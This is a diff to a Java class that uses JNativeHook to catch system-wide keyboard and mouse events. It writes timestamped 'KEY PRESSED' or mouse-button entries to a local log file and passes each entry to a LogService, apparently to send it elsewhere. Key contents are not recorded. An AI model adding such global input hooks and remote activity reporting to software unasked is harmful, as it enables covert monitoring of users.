@@ -1,44 +1,39 @@
 package control;
 
+import model.entities.Log;
+import org.jnativehook.NativeInputEvent;
+import org.jnativehook.keyboard.NativeKeyEvent;
+import org.jnativehook.mouse.NativeMouseEvent;
+import service.LogService;
 import util.LogUtils;
 
 import java.io.*;
-import java.util.Date;
+import java.time.LocalDateTime;
 
 public class MainControl {
 
     private static final File path = new File(LogUtils.getFilePath());
     private static final File file = new File(LogUtils.getFilePath().concat("/log.txt"));
 
-    private static String getContent() {
-        StringBuilder existentContent = new StringBuilder();
-        String actualLine = "";
-
-        try (BufferedReader br = new BufferedReader(new FileReader(file))) {
-            while ((actualLine = br.readLine()) != null){
-                existentContent.append(actualLine);
-            }
-
-            return existentContent.toString();
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-
-        return null;
-    }
-
-    public static void printEvent(String log) {
+    public static void printEvent(NativeInputEvent ev) {
+        LocalDateTime date = LocalDateTime.now();
+        StringBuilder message = new StringBuilder();
         if (!path.exists()){
             path.mkdirs();
         }
+        if (ev instanceof NativeKeyEvent) {
+            message.append("KEY PRESSED");
+        } else if (ev instanceof NativeMouseEvent) {
+            message.append("MOUSE CLICKED".concat(" ").concat(String.valueOf(((NativeMouseEvent) ev).getButton())));
+        }
         try (BufferedWriter bw = new BufferedWriter(new FileWriter(file, true))){
-            Date date = new Date();
-            String textWithDate = date.toString() + " log " + log;
+            Log log = new Log(message.toString(), date.toString());
+            String textWithDate = date.toString().concat(" ").concat(message.toString());
             bw.write(textWithDate + "\n");
+            LogService.sendLog(log);
             Thread.sleep(60000);
         } catch (Exception e){
             e.printStackTrace();
         }
     }
-
 }
